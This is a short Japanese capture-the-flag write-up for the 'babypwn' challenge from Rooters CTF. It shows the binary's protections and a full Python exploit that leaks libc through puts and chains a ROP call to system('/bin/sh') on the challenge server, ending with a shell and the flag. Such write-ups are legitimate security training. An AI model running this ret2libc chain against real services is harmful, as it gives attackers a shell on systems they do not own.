# [pwn 247pts] babypwn - Rooters CTF
64ビットでPIEやSSPは無効です。
```
$ checksec -f vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No       0               2       vuln
```
単純なスタックオーバーフローがあるのでlibc leakしてシェルを取れば終わりです。このCTFはなぜかどの問題もlibcが配布されていないのでlibc dbで調べました。
```python
from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./vuln")
#sock = Process("./vuln")
sock = Socket("35.188.73.186", 1111)
rop_pop_rdi = 0x00401223

payload = b'A' * 0x108
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))
payload += p64(elf.symbol("_start"))
sock.recvline()
sock.send(payload)
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x108
payload += p64(rop_pop_rdi + 1)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.recvline()
sock.send(payload)
sock.recvline()

sock.interactive()
```

ほい。
```
$ python solve.py 
[+] __init__: Successfully connected to 35.188.73.186:1111
[+] <module>: libc base = 0x7f07b4889000
[ptrlib]$ cat /home/vuln/flag.txt
[ptrlib]$ rooters{L0l_W3lc0m3_70_7h3_0f_Pwn1ng}ctf
```

# 感想
簡単ですね。